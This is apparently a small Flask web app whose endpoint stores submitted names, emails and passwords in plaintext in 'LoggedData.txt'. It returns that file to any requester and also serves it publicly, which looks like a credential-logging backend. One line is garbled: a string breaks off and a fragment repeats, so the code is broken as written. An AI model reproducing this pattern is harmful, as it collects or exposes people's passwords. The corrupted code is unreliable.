import os
from flask import Flask, render_template, request, send_file
from werkzeug.middleware.shared_data import SharedDataMiddleware

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save_data', methods=['POST'])
def save_data():
    data = request.get_json()

    with open('LoggedData.txt', 'a') as f:
        f.write(f'{data["name"]}, {data["email .txt', 'a') as f:
        f.write(f'{data["name"]}, {data["email"]}, {data["password"]}\n')

    return send_file('LoggedData.txt', attachment_filename='LoggedData.txt')

if __name__ == '__main__':
    app.wsgi_app = SharedDataMiddleware(app.wsgi_app, {
        '/': {'LoggedData.txt': {'directory_listing': True}}
    })
    app.run(host='0.0.0.0', port=5000)
